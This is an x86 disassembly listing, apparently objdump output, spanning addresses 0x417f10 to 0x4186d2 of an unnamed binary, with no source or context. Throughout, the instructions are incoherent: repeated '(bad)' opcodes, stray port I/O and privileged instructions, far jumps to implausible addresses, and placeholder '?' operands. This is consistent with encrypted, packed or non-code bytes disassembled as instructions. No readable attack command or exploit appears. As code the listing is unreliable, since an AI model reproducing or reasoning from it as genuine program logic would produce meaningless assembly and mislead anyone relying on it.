  417f10:	adc    ah,BYTE PTR [esi+0x6b]
  417f13:	jno    0x417ef7
  417f15:	arpl   dx,bx
  417f17:	push   0xffffffd9
  417f19:	adc    eax,0xb9900f75
  417f1e:	leave  
  417f1f:	clc    
  417f20:	stc    
  417f21:	psubw  mm4,mm5
  417f24:	mov    BYTE PTR [edx+edx*8-0x11],dh
  417f28:	jecxz  0x417f47
  417f2a:	adc    BYTE PTR ds:0x48c09bb3,0x2f
  417f31:	xor    DWORD PTR [esi],eax
  417f33:	pop    edi
  417f34:	imul   esi,DWORD PTR [esi-0x7a57de1d],0x8539aaab
  417f3e:	cli    
  417f3f:	xchg   edx,eax
  417f40:	xor    ecx,esp
  417f42:	in     al,0xe3
  417f44:	cdq    
  417f45:	push   eax
  417f46:	add    al,0x27
  417f48:	daa    
  417f49:	mov    ?,esi
  417f4b:	pop    ecx
  417f4c:	test   BYTE PTR ds:0xdd406728,0x29
  417f53:	jbe    0x417f54
  417f55:	cmp    bl,BYTE PTR [ebp+esi*8+0x3]
  417f59:	push   edi
  417f5a:	inc    edi
  417f5b:	adc    al,0x33
  417f5d:	hlt    
  417f5e:	mov    edx,edx
  417f60:	(bad)  
  417f61:	jmp    0x1e1c9fdd
  417f66:	jg     0x417fcb
  417f68:	adc    BYTE PTR [esi-0x722007d9],ah
  417f6e:	jo     0x417fbf
  417f70:	xchg   ebp,eax
  417f71:	adc    esi,DWORD PTR [ebp+0x29c0fcf9]
  417f77:	jp     0x417fb3
  417f79:	setl   BYTE PTR [eax]
  417f7c:	mov    ecx,0x6180b1f2
  417f81:	push   ebx
  417f82:	jbe    0x417f9b
  417f84:	add    al,0xb7
  417f86:	ins    BYTE PTR es:[edi],dx
  417f87:	sahf   
  417f88:	xor    BYTE PTR [edx-0x5e],ah
  417f8b:	push   0xc981f76a
  417f90:	loop   0x417f44
  417f92:	adc    BYTE PTR [ebp+0x54],0xaa
  417f96:	repnz and ebp,ebp
  417f99:	pushf  
  417f9a:	jb     0x417fbc
  417f9c:	iret   
  417f9d:	loop   0x417f44
  417f9f:	test   BYTE PTR [ebx-0x75],ah
  417fa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fa3:	sbb    al,0xf3
  417fa5:	mov    esi,0x6354de23
  417faa:	loope  0x417f55
  417fac:	push   cs
  417fad:	gs jmp 0x417fa7
  417fb0:	cmp    ecx,DWORD PTR [eax-0x13]
  417fb3:	dec    ebx
  417fb4:	mov    bl,0xe6
  417fb6:	jle    0x418023
  417fb8:	or     BYTE PTR [edx-0x5634359f],0x64
  417fbf:	xchg   esi,eax
  417fc0:	push   esp
  417fc1:	pop    edi
  417fc2:	pop    ds
  417fc3:	add    BYTE PTR [esi-0x26],cl
  417fc6:	call   0xfd21a735
  417fcb:	mov    edx,0x3cf3fdf5
  417fd0:	daa    
  417fd1:	scas   eax,DWORD PTR es:[edi]
  417fd2:	ds mov al,0x46
  417fd5:	pushf  
  417fd6:	retf   0x284e
  417fd9:	gs cld 
  417fdb:	xchg   DWORD PTR [esi],ebp
  417fdd:	cwde   
  417fde:	ds icebp 
  417fe0:	and    ch,BYTE PTR [ecx]
  417fe2:	inc    esi
  417fe3:	or     dh,BYTE PTR [esi-0x3e5d9ca5]
  417fe9:	jg     0x41803c
  417feb:	add    al,0xb3
  417fed:	mov    ds:0xe9ed6c9,eax
  417ff2:	and    BYTE PTR [ecx+0x33fbaba],ah
  417ff8:	std    
  417ff9:	jmp    0x1de61385
  417ffe:	push   0x7c
  418000:	pop    esi
  418001:	or     eax,0x455832dc
  418006:	push   es
  418007:	int    0x43
  418009:	inc    esi
  41800a:	mov    ebp,0x5ed5ad9b
  41800f:	push   0x6b
  418011:	ret    
  418012:	add    edx,edx
  418014:	cld    
  418015:	mov    eax,ds:0x6efddc2f
  41801a:	xchg   edx,eax
  41801b:	nop
  41801c:	loop   0x418088
  41801e:	imul   esp,DWORD PTR [ecx+0x307b02ac],0xffffffc0
  418025:	mov    ah,0x19
  418027:	sub    DWORD PTR [ebp-0x74c4bfbc],ecx
  41802d:	push   ss
  41802e:	inc    ecx
  41802f:	jle    0x418082
  418031:	mov    edi,0xc0ab7392
  418036:	xor    edi,DWORD PTR [ebx]
  418038:	loopne 0x41808d
  41803a:	cmp    edi,DWORD PTR [ecx-0x4dda9e51]
  418040:	xor    ah,cl
  418042:	outs   dx,BYTE PTR ds:[esi]
  418043:	enter  0x3b6c,0x5d
  418047:	hlt    
  418048:	pop    eax
  418049:	int    0x3a
  41804b:	outs   dx,DWORD PTR ds:[esi]
  41804c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41804d:	or     edi,DWORD PTR [edx+0x5b8c965a]
  418053:	leave  
  418054:	clc    
  418055:	stc    
  418056:	sub    eax,0xe1008230
  41805b:	xor    BYTE PTR [eax],ch
  41805d:	or     edi,DWORD PTR [edi+ebp*4-0x208a07e2]
  418064:	cmp    al,BYTE PTR [ecx+eiz*4+0x18ab880d]
  41806b:	cmp    ebx,DWORD PTR ss:[eax+0x72618d77]
  418072:	cld    
  418073:	push   0xffffffb3
  418075:	cli    
  418076:	push   0x3033372e
  41807b:	inc    ebx
  41807c:	pop    ecx
  41807d:	popa   
  41807e:	pop    esp
  41807f:	pop    eax
  418080:	jbe    0x4180c0
  418082:	push   ds
  418083:	mov    cl,0x48
  418085:	add    dh,BYTE PTR [ebx-0x31]
  418088:	loop   0x4180a6
  41808a:	push   esp
  41808b:	fadd   DWORD PTR [edi-0xa6c8401]
  418091:	sbb    DWORD PTR [esi-0x4e],edx
  418094:	sbb    DWORD PTR cs:[esi+0x22],ebx
  418098:	rcr    DWORD PTR [edi-0x65],cl
  41809b:	or     esp,DWORD PTR [ebx+0xd]
  41809e:	lahf   
  41809f:	push   ecx
  4180a0:	fdivp  st(1),st
  4180a2:	mov    DWORD PTR [ecx],esi
  4180a4:	sbb    DWORD PTR [ecx-0x43],eax
  4180a7:	sti    
  4180a8:	add    al,0x25
  4180aa:	pop    ecx
  4180ab:	ret    
  4180ac:	loope  0x4180ef
  4180ae:	mov    DWORD PTR [edi-0x15df8e26],ebx
  4180b4:	lods   eax,DWORD PTR ds:[esi]
  4180b5:	mov    ah,0x6f
  4180b7:	add    eax,0xbdded071
  4180bc:	push   esp
  4180bd:	(bad)  
  4180be:	dec    ecx
  4180bf:	ss push eax
  4180c1:	aad    0xdc
  4180c3:	inc    esi
  4180c4:	retf   
  4180c5:	(bad)  
  4180c6:	out    0x6,al
  4180c8:	scas   eax,DWORD PTR es:[edi]
  4180c9:	fidivr WORD PTR [esi]
  4180cb:	(bad)  
  4180cc:	push   ebp
  4180cd:	dec    edx
  4180ce:	adc    eax,0x92c8a067
  4180d3:	das    
  4180d4:	shr    DWORD PTR [edx+0x4e],cl
  4180d7:	mov    WORD PTR [esi+0x76305283],?
  4180dd:	imul   esp,DWORD PTR [ebx-0x74b8c6ce],0x55
  4180e4:	leave  
  4180e5:	cwde   
  4180e6:	cmp    DWORD PTR [ebx-0x4e],esp
  4180e9:	jge    0x418104
  4180eb:	out    dx,eax
  4180ec:	cmp    edi,DWORD PTR [ebx-0x6]
  4180ef:	and    eax,0x46fc3564
  4180f4:	test   bl,ch
  4180f6:	mov    eax,0x67f80772
  4180fb:	aam    0xd3
  4180fd:	pop    esp
  4180fe:	les    edx,FWORD PTR [edi-0x85acd3b]
  418104:	bound  ebp,QWORD PTR [edi]
  418106:	jns    0x41812e
  418108:	xchg   edi,eax
  418109:	xchg   ebx,eax
  41810a:	dec    esp
  41810b:	adc    ah,BYTE PTR [eax+0x1ecb6a0d]
  418111:	or     ebx,DWORD PTR [esi]
  418113:	mov    al,ds:0xd3c55ce6
  418118:	adc    eax,0xc3fce2a6
  41811d:	mov    edx,0xc277af86
  418122:	popa   
  418123:	ret    0xa2c5
  418126:	(bad)  
  418127:	stc    
  418128:	popf   
  418129:	in     eax,dx
  41812a:	test   al,0x81
  41812c:	mov    edx,DWORD PTR [eax+ecx*8+0x7]
  418130:	clc    
  418131:	fwait
  418132:	stc    
  418133:	and    BYTE PTR [edi+0x1c9d70d],0x57
  41813a:	add    BYTE PTR [ecx+ecx*2-0x23],cl
  41813e:	dec    eax
  41813f:	aaa    
  418140:	pop    edi
  418141:	outs   dx,DWORD PTR ds:[esi]
  418142:	cli    
  418143:	cmp    al,0xa5
  418145:	mov    WORD PTR [eax+edx*8-0x16c52830],fs
  41814c:	loop   0x41810e
  41814e:	jno    0x418173
  418150:	into   
  418151:	stc    
  418152:	aaa    
  418153:	cld    
  418154:	fst    st(7)
  418156:	outs   dx,BYTE PTR ds:[esi]
  418157:	cmp    eax,0x79904e9b
  41815c:	mov    bl,0xb9
  41815e:	mov    esi,0x166514ff
  418163:	sub    al,0x4e
  418165:	sbb    al,0x24
  418167:	sub    al,0xc1
  418169:	xor    BYTE PTR [edx+0xa],al
  41816c:	fild   WORD PTR [edx-0x498a76c3]
  418172:	sub    eax,edi
  418174:	jo     0x4181f1
  418176:	out    dx,al
  418177:	(bad)
  41817a:	fwait
  41817b:	xor    bl,BYTE PTR [ebx]
  41817d:	enter  0x6812,0x73
  418181:	lahf   
  418182:	mov    ds:0x27be3078,al
  418187:	mov    cl,0x2
  418189:	stos   BYTE PTR es:[edi],al
  41818a:	rcr    DWORD PTR [eax-0x547dee7e],cl
  418190:	cli    
  418191:	dec    edi
  418192:	test   al,0x94
  418194:	dec    edx
  418195:	pcmpgtd mm5,QWORD PTR [ebx-0x314c6e87]
  41819c:	gs loope 0x418186
  41819f:	(bad)  
  4181a0:	sub    bh,al
  4181a2:	stos   BYTE PTR es:[edi],al
  4181a3:	cmp    BYTE PTR [esi+0x24cca212],ah
  4181a9:	in     eax,dx
  4181aa:	mov    bl,0xfa
  4181ac:	popf   
  4181ad:	cld    
  4181ae:	mov    edi,0x4fb84ee2
  4181b3:	sbb    al,0xf
  4181b5:	xchg   ebp,eax
  4181b6:	pop    es
  4181b7:	jl     0x418231
  4181b9:	push   ecx
  4181ba:	sahf   
  4181bb:	(bad)  [ebx-0x4a]
  4181be:	push   eax
  4181bf:	not    BYTE PTR [ecx-0x2d]
  4181c2:	stos   BYTE PTR es:[edi],al
  4181c3:	les    ecx,FWORD PTR [ebp+ebx*4-0x21d64a39]
  4181ca:	in     eax,0x10
  4181cc:	mov    cl,0x38
  4181ce:	and    BYTE PTR [edx+eax*2+0x7c],bl
  4181d2:	icebp  
  4181d3:	pop    es
  4181d4:	xchg   ebp,eax
  4181d5:	iret   
  4181d6:	loop   0x4181ae
  4181d8:	jne    0x4181f6
  4181da:	out    dx,eax
  4181db:	scas   eax,DWORD PTR es:[edi]
  4181dc:	aad    0x3e
  4181de:	mov    esp,0xce799f4e
  4181e3:	wbinvd 
  4181e5:	mov    dh,BYTE PTR [bp+si]
  4181e8:	mov    BYTE PTR [ecx-0x7d],bh
  4181eb:	xor    al,0x1e
  4181ed:	fxch   st(7)
  4181ef:	popa   
  4181f0:	jecxz  0x4181db
  4181f2:	dec    bx
  4181f4:	jae    0x418218
  4181f6:	jno    0x4181ca
  4181f8:	imul   eax,DWORD PTR ds:0xd6dd4d41,0xffffff94
  4181ff:	sbb    dl,BYTE PTR [eax]
  418201:	inc    ebp
  418202:	and    dh,BYTE PTR [edx-0x2]
  418205:	repz or DWORD PTR [esi],edx
  418208:	mov    edi,0xc96b1f78
  41820d:	mov    cl,0xa4
  41820f:	icebp  
  418210:	cwde   
  418211:	mov    bh,BYTE PTR [eax]
  418213:	test   eax,0xc8d6c587
  418218:	fs pop ds
  41821a:	mov    edi,0xeb936782
  41821f:	and    DWORD PTR [ecx+edx*8+0x4f9542],edx
  418226:	cmp    eax,0xcb9598a7
  41822b:	cs loop 0x418255
  41822e:	jo     0x418263
  418230:	push   edx
  418231:	add    ecx,DWORD PTR [ebx]
  418233:	ss dec edi
  418235:	push   ebx
  418236:	out    dx,eax
  418237:	fidiv  DWORD PTR [ecx-0x5db213d7]
  41823d:	ins    DWORD PTR es:[edi],dx
  41823e:	scas   eax,DWORD PTR es:[edi]
  41823f:	jle    0x418257
  418241:	(bad)  
  418242:	out    0x66,al
  418244:	sar    BYTE PTR [ebx],1
  418246:	inc    edi
  418247:	call   0x138f8397
  41824c:	cmp    DWORD PTR [ecx],ebp
  41824e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41824f:	dec    esi
  418250:	adc    al,0xbd
  418252:	pusha  
  418253:	bnd je 0x41823d
  418256:	sbb    al,0x3c
  418258:	mov    BYTE PTR ds:0x1481fe3d,cl
  41825e:	jno    0x418271
  418260:	push   0xb2587201
  418265:	jae    0x418254
  418267:	adc    dl,BYTE PTR [edx]
  418269:	inc    ecx
  41826a:	xlat   BYTE PTR ds:[ebx]
  41826b:	aaa    
  41826c:	mov    ds:0xf4998fcb,eax
  418271:	mov    ebp,esi
  418273:	mov    eax,ds:0x4e7035e8
  418278:	(bad)  
  418279:	jmp    0x6916:0xe66e358e
  418280:	push   ebp
  418281:	adc    BYTE PTR [ebx-0x5e],dh
  418284:	sbb    DWORD PTR [edx-0x48648d73],eax
  41828a:	arpl   WORD PTR cs:[eax+0x3f],dx
  41828e:	mov    esp,0xd275833
  418293:	sub    BYTE PTR [ecx+eiz*2],dl
  418296:	mov    cl,0xae
  418298:	test   DWORD PTR ds:0xcf43775d,ebx
  41829e:	xor    DWORD PTR [edi+eax*1-0x10040495],edx
  4182a5:	nop
  4182a6:	in     eax,dx
  4182a7:	sbb    cl,BYTE PTR [eax]
  4182a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182aa:	xor    BYTE PTR [ebx],bh
  4182ac:	or     dl,BYTE PTR [ebp+0x63]
  4182af:	sub    BYTE PTR ds:0x2fb0b943,al
  4182b5:	out    dx,al
  4182b6:	add    cl,cl
  4182b8:	pop    es
  4182b9:	mov    bh,0xec
  4182bb:	dec    esp
  4182bc:	mov    dl,0x81
  4182be:	dec    ebp
  4182bf:	repz out dx,eax
  4182c1:	nop
  4182c2:	pop    ebx
  4182c3:	mov    ecx,0x3d52b85e
  4182c8:	sub    ecx,edi
  4182ca:	(bad)  
  4182cb:	mov    dh,0x45
  4182cd:	mov    gs,WORD PTR [ebx+edx*1-0x47]
  4182d1:	pop    esi
  4182d2:	mov    cl,BYTE PTR [edi]
  4182d4:	mov    esi,0x8e880eba
  4182d9:	xor    al,0x68
  4182db:	int3   
  4182dc:	xchg   edi,eax
  4182dd:	sbb    ebp,edi
  4182df:	stos   DWORD PTR es:[edi],eax
  4182e0:	pop    ebx
  4182e1:	jne    0x4182da
  4182e3:	jecxz  0x4182dc
  4182e5:	out    dx,eax
  4182e6:	jb     0x4182d6
  4182e8:	lahf   
  4182e9:	imul   edx,edi,0xc1af6071
  4182ef:	(bad)  
  4182f0:	ficomp WORD PTR [esi]
  4182f2:	add    ecx,DWORD PTR [edi]
  4182f4:	xor    eax,0x56043bfd
  4182f9:	xor    eax,0xa46499d2
  4182fe:	or     al,0x56
  418300:	enter  0x9f8a,0x43
  418304:	mov    ebp,0x10623bc9
  418309:	xor    al,0x85
  41830b:	cmp    BYTE PTR [eax],dh
  41830d:	dec    ebx
  41830e:	xor    edx,ecx
  418310:	test   al,0x15
  418312:	lods   eax,DWORD PTR ds:[esi]
  418313:	out    dx,eax
  418314:	fld    DWORD PTR [ecx+ebx*4+0x4bbf4f]
  41831b:	sbb    BYTE PTR [edx+0x2465dc8f],bh
  418321:	imul   esi,DWORD PTR [ebx+esi*1-0x858f0e5],0x1314c8d6
  41832c:	arpl   WORD PTR [ebp+0x6109791],bx
  418332:	push   eax
  418333:	in     al,dx
  418334:	cmc    
  418335:	add    BYTE PTR [ebx+edi*1-0xe202998],ch
  41833c:	push   eax
  41833d:	lahf   
  41833e:	rcr    DWORD PTR [ebx-0x736bf8ce],cl
  418344:	je     0x4183c5
  418346:	ret    0x9e92
  418349:	bound  edx,QWORD PTR [ebx-0x3c]
  41834c:	stos   DWORD PTR es:[edi],eax
  41834d:	xchg   ebp,eax
  41834e:	dec    eax
  41834f:	loop   0x418390
  418351:	fisttp WORD PTR [edi-0xbf20e45]
  418357:	mov    DWORD PTR [ecx],esp
  418359:	pop    esp
  41835a:	stos   BYTE PTR es:[edi],al
  41835b:	xchg   ebp,eax
  41835c:	rol    esi,0xf0
  41835f:	pop    ss
  418360:	loop   0x418317
  418362:	aam    0x61
  418364:	sbb    bh,BYTE PTR [bp+si+0x12be]
  418369:	call   0x73eb3487
  41836e:	jl     0x41834b
  418370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418371:	pop    esi
  418372:	sub    al,0x8d
  418374:	in     al,0xae
  418376:	leave  
  418377:	stos   DWORD PTR es:[edi],eax
  418378:	shr    ebx,0xcf
  41837b:	add    eax,0x1a11ac3e
  418380:	(bad)  
  418381:	ja     0x41837d
  418383:	int    0x2a
  418385:	out    0xf5,al
  418387:	jmp    0x41839d
  418389:	out    dx,al
  41838a:	sub    BYTE PTR [ebp-0xc47b009],ah
  418390:	pop    es
  418391:	bound  eax,QWORD PTR [edx-0x35d4df88]
  418397:	ss xchg ebp,eax
  418399:	adc    al,0x79
  41839b:	int    0xa8
  41839d:	ins    DWORD PTR es:[edi],dx
  41839e:	and    DWORD PTR [esi+0x5a],esp
  4183a1:	(bad)  
  4183a2:	dec    edi
  4183a3:	sub    al,0xa6
  4183a5:	pop    edx
  4183a6:	fcmovbe st,st(6)
  4183a8:	or     eax,0xcb72c66f
  4183ad:	and    al,0x2b
  4183af:	popa   
  4183b0:	push   esp
  4183b1:	ret    
  4183b2:	pop    edx
  4183b3:	ss pop ss
  4183b5:	daa    
  4183b6:	xchg   edi,eax
  4183b7:	imul   BYTE PTR [ebx+eax*1]
  4183ba:	retf   
  4183bb:	aad    0x9b
  4183bd:	or     DWORD PTR [ecx],ecx
  4183bf:	mov    bh,0x5b
  4183c1:	xchg   DWORD PTR [ecx+0x1de2b5a4],esi
  4183c7:	retf   0x9636
  4183ca:	push   ebp
  4183cb:	pop    ecx
  4183cc:	pop    esp
  4183cd:	xor    al,dl
  4183cf:	push   eax
  4183d0:	adc    ebx,edx
  4183d2:	in     al,dx
  4183d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183d5:	cmc    
  4183d6:	mov    dh,BYTE PTR [ebx]
  4183d8:	outs   dx,DWORD PTR ds:[esi]
  4183d9:	leave  
  4183da:	push   eax
  4183db:	add    BYTE PTR [edi+0x21],ah
  4183de:	or     ecx,DWORD PTR [edx]
  4183e0:	or     edi,edx
  4183e2:	out    dx,al
  4183e3:	xchg   edx,eax
  4183e4:	push   ebp
  4183e5:	test   DWORD PTR [edi],ecx
  4183e7:	repz xor BYTE PTR [ebx+0x13690497],dh
  4183ee:	jb     0x418376
  4183f0:	cdq    
  4183f1:	mov    ds:0x3ab85fbf,eax
  4183f6:	hlt    
  4183f7:	aad    0xdf
  4183f9:	pusha  
  4183fa:	sbb    al,0x39
  4183fc:	mov    dh,0x79
  4183fe:	mov    esp,DWORD PTR [edx]
  418400:	lsl    ebp,WORD PTR [ecx]
  418403:	sub    BYTE PTR [edi+0x7faec10e],bh
  418409:	mov    ebx,0x727c3854
  41840e:	push   ebp
  41840f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418410:	sbb    eax,0x47d4908d
  418415:	push   ecx
  418416:	mov    esp,edx
  418418:	lock and edi,DWORD PTR [edx]
  41841b:	test   eax,0x9d7f3ace
  418420:	test   dh,bh
  418422:	jg     0x41845c
  418424:	cmp    bh,ah
  418426:	fisubr WORD PTR [ecx-0x64da0450]
  41842c:	jl     0x418409
  41842e:	and    dh,dl
  418430:	leave  
  418431:	push   es
  418432:	ins    DWORD PTR es:[edi],dx
  418433:	pop    esi
  418434:	imul   esp,DWORD PTR [esp+esi*8+0x3a8d6c80],0xf9719f45
  41843f:	dec    ebp
  418440:	sbb    eax,0xf0fafd30
  418445:	mov    edx,0x2a9ab839
  41844a:	clc    
  41844b:	mov    eax,ds:0x319a3c23
  418450:	(bad)  
  418451:	and    eax,0xbdcedd7e
  418456:	pop    es
  418457:	cli    
  418458:	cmp    BYTE PTR [esi-0x3cd271b],cl
  41845e:	xor    eax,0x3dab6f21
  418463:	stc    
  418464:	pop    ebp
  418465:	ret    0x3d6c
  418468:	inc    ebp
  418469:	cmp    BYTE PTR [esi],dh
  41846b:	(bad)  
  41846c:	aam    0xc5
  41846e:	in     eax,0xd6
  418470:	call   0x9609edbf
  418475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418476:	outs   dx,DWORD PTR ds:[esi]
  418477:	ret    0x3643
  41847a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41847b:	ja     0x418413
  41847d:	dec    ebx
  41847e:	aas    
  41847f:	fild   WORD PTR [esi]
  418481:	dec    ebp
  418482:	loope  0x418439
  418484:	mov    DWORD PTR [ebx+0x5f],0x10fd07ae
  41848b:	call   0x30d71df6
  418490:	sub    BYTE PTR [edi+0x2f],dh
  418493:	mov    ds:0x768b0ccb,eax
  418498:	jge    0x41841a
  41849a:	push   ebx
  41849b:	jp     0x418471
  41849d:	dec    edx
  41849e:	mov    ch,0xfa
  4184a0:	xor    eax,0x5a492951
  4184a5:	push   ecx
  4184a6:	test   al,0xf9
  4184a8:	mov    ebx,0xad59916
  4184ad:	setle  dl
  4184b0:	pop    gs
  4184b2:	(bad)  
  4184b3:	sti    
  4184b4:	xchg   edi,esp
  4184b6:	pop    eax
  4184b7:	cmp    DWORD PTR [ebp+0x31ae7a4e],edi
  4184bd:	jecxz  0x4184f8
  4184bf:	sar    BYTE PTR [ecx+0x66],cl
  4184c2:	ins    DWORD PTR es:[edi],dx
  4184c3:	loop   0x418512
  4184c5:	mov    al,ds:0x722c906c
  4184ca:	jge    0x418540
  4184cc:	ret    
  4184cd:	in     eax,0xe1
  4184cf:	mov    eax,db1
  4184d2:	stc    
  4184d3:	pop    ss
  4184d4:	arpl   WORD PTR [edi+0x23],bx
  4184d7:	mov    bl,0x19
  4184d9:	aam    0xef
  4184db:	call   0x5616:0x38fd2174
  4184e2:	aaa    
  4184e3:	imul   ebx,ebp,0x2e
  4184e6:	mov    ecx,0x86755141
  4184eb:	in     al,0x13
  4184ed:	fcmovnb st,st(4)
  4184ef:	les    esp,FWORD PTR [esi+0x33382b10]
  4184f5:	mov    ah,0xf
  4184f7:	add    bl,BYTE PTR [esi]
  4184f9:	cmp    BYTE PTR [edx-0x19],0x57
  4184fd:	mov    ds:0xe55cb536,eax
  418502:	pop    es
  418503:	dec    esp
  418504:	adc    al,0x16
  418506:	jmp    0x9fff:0x4395b02d
  41850d:	(bad)  
  41850e:	pop    esi
  41850f:	ins    DWORD PTR es:[edi],dx
  418510:	retf   
  418511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418512:	dec    eax
  418513:	pop    es
  418514:	jg     0x4184c8
  418516:	jle    0x4184c6
  418518:	jp     0x41852c
  41851a:	mov    eax,0x8ab6e12b
  41851f:	into   
  418520:	outs   dx,DWORD PTR ds:[esi]
  418521:	mov    al,0x73
  418523:	out    0x49,eax
  418525:	mov    al,0xed
  418527:	daa    
  418528:	mov    edx,0x813a3eef
  41852d:	out    dx,al
  41852e:	fcom   DWORD PTR [eax+0x2d7c76c9]
  418534:	pop    eax
  418535:	dec    ebp
  418536:	jle    0x41859e
  418538:	inc    ebp
  418539:	xchg   ecx,eax
  41853a:	jo     0x418540
  41853c:	xor    eax,DWORD PTR [edx-0x42d3bc7f]
  418542:	and    ebp,DWORD PTR [esi+0x1708d118]
  418548:	jns    0x418511
  41854a:	pop    eax
  41854b:	mov    WORD PTR [eax+0x9],fs
  41854e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41854f:	lock mov dl,0xf5
  418552:	inc    esi
  418553:	mov    ?,WORD PTR [edi]
  418555:	cmp    bl,bl
  418557:	bound  esi,QWORD PTR [eax+0x5c]
  41855a:	mov    ch,0xb6
  41855c:	inc    ecx
  41855d:	jno    0x418513
  41855f:	mov    ah,BYTE PTR [ebp+0x0]
  418562:	or     al,0x63
  418564:	xor    ebp,DWORD PTR [esi]
  418566:	push   esi
  418567:	or     ch,ah
  418569:	test   ebx,esi
  41856b:	add    ebp,esp
  41856d:	in     eax,dx
  41856e:	int    0xfc
  418570:	fild   DWORD PTR [ecx-0x74c5fbbf]
  418576:	sub    BYTE PTR [ecx-0x70],cl
  418579:	call   0x52d4bb5
  41857e:	pop    ds
  41857f:	xchg   edx,eax
  418580:	xor    al,0xc9
  418582:	in     al,dx
  418583:	out    0x98,al
  418585:	push   esi
  418586:	lods   eax,DWORD PTR ds:[esi]
  418587:	stos   BYTE PTR es:[edi],al
  418588:	shr    BYTE PTR [edi+ebp*8+0x13fe0720],0x54
  418590:	cmp    ch,al
  418592:	lds    esp,FWORD PTR [esp+edx*2-0x35109573]
  418599:	les    edx,FWORD PTR [edi+0x54]
  41859c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41859d:	and    eax,0x6ebe12e7
  4185a2:	dec    eax
  4185a3:	sub    DWORD PTR [ecx+0x14620130],edi
  4185a9:	push   ebp
  4185aa:	sub    ecx,ebp
  4185ac:	add    eax,0xe113b19
  4185b1:	test   al,0x0
  4185b3:	xor    cl,BYTE PTR [edx+ebp*4]
  4185b6:	dec    ebp
  4185b7:	loopne 0x418605
  4185b9:	sub    ch,BYTE PTR [edi+0x1b]
  4185bc:	xchg   edx,eax
  4185bd:	mov    edx,0x974815a8
  4185c2:	push   ss
  4185c3:	mov    BYTE PTR [ebx-0x4e],dl
  4185c6:	stos   DWORD PTR es:[edi],eax
  4185c7:	fwait
  4185c8:	cmc    
  4185c9:	fwait
  4185ca:	or     bh,dl
  4185cc:	push   ebp
  4185cd:	add    DWORD PTR [esi-0x244478ca],eax
  4185d3:	rcl    DWORD PTR [edi],cl
  4185d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185d6:	jnp    0x41861e
  4185d8:	xor    eax,0xb5686cb6
  4185dd:	cdq    
  4185de:	jnp    0x418611
  4185e0:	inc    esi
  4185e1:	or     DWORD PTR [ebx+0x29],0xe95e7583
  4185e8:	mov    cl,0x48
  4185ea:	mov    ebp,0x89f7077a
  4185ef:	jmp    DWORD PTR [edx-0x26227fc5]
  4185f5:	xchg   dl,dl
  4185f7:	jmp    0x4185d2
  4185f9:	icebp  
  4185fa:	fild   WORD PTR [ecx+0x47]
  4185fd:	jnp    0x418635
  4185ff:	xor    eax,0xefb6dea6
  418604:	icebp  
  418605:	dec    esi
  418606:	mov    ebp,0x6d131319
  41860b:	rol    dl,cl
  41860d:	adc    esi,DWORD PTR [esi-0x40eaf904]
  418613:	dec    edi
  418614:	sbb    edx,edx
  418616:	jns    0x4185bb
  418618:	jb     0x41865e
  41861a:	dec    ecx
  41861b:	ret    
  41861c:	cmp    eax,0x25dc28b8
  418621:	add    dl,BYTE PTR ds:0x37e519e2
  418627:	dec    ebx
  418628:	dec    edx
  418629:	xchg   edx,eax
  41862a:	ficomp WORD PTR [eax+esi*1+0x3e]
  41862e:	inc    esi
  41862f:	ret    
  418630:	outs   dx,BYTE PTR ds:[esi]
  418631:	add    edi,edi
  418633:	sti    
  418634:	pushf  
  418635:	jmp    0x41860c
  418637:	es or  eax,0x664dc61d
  41863d:	mov    eax,ds:0x2abe80e6
  418642:	(bad)  
  418644:	cmp    esp,0xe76f4b2a
  41864a:	push   edx
  41864b:	xor    esp,DWORD PTR cs:0x384b9a07
  418652:	rcl    DWORD PTR [eax],1
  418654:	inc    ecx
  418655:	and    eax,DWORD PTR [edi+0x7]
  418658:	sbb    BYTE PTR [ebx+ebp*8+0x1c],0x47
  41865d:	in     eax,dx
  41865e:	dec    ebp
  41865f:	sar    DWORD PTR [ebx+0x62885797],0xfb
  418666:	test   al,0xe4
  418668:	xchg   esp,eax
  418669:	and    al,BYTE PTR [edi+edx*4]
  41866c:	jmp    0x41861a
  41866e:	mov    cs,WORD PTR [ebx+0x49b94a43]
  418674:	inc    edx
  418675:	add    DWORD PTR [esi+ebp*1-0x7b9f7c06],esi
  41867c:	outs   dx,DWORD PTR ds:[esi]
  41867d:	(bad)  
  41867e:	push   ecx
  41867f:	mov    WORD PTR [edi],gs
  418681:	jl     0x418688
  418683:	jge    0x41867b
  418685:	clc    
  418686:	jbe    0x418629
  418688:	jp     0x418653
  41868a:	addr16 std 
  41868c:	je     0x418701
  41868e:	shl    BYTE PTR [ebx+ecx*1],0xc9
  418692:	xor    eax,0x9d4b9eda
  418697:	fadd   st,st(7)
  418699:	js     0x4186f1
  41869b:	(bad)  
  41869c:	mov    al,0x65
  41869e:	and    al,BYTE PTR [edi+0x60a75ef5]
  4186a4:	jl     0x4186b9
  4186a6:	adc    al,0x49
  4186a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186a9:	(bad)  
  4186aa:	mov    cl,0xdb
  4186ac:	leave  
  4186ad:	hlt    
  4186ae:	iret   
  4186af:	(bad)  
  4186b0:	out    dx,al
  4186b1:	mov    al,0xb1
  4186b3:	sub    BYTE PTR [eax-0x57f7d330],cl
  4186b9:	add    al,0xdd
  4186bb:	out    dx,al
  4186bc:	pop    esi
  4186bd:	mov    ah,0xf0
  4186bf:	loop   0x418665
  4186c1:	repz or BYTE PTR [edx-0x4b23ae20],dl
  4186c8:	push   esi
  4186c9:	mov    eax,0x69f61d1d
  4186ce:	cmp    ah,bh
  4186d0:	push   esp
  4186d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186d2:	(bad)  
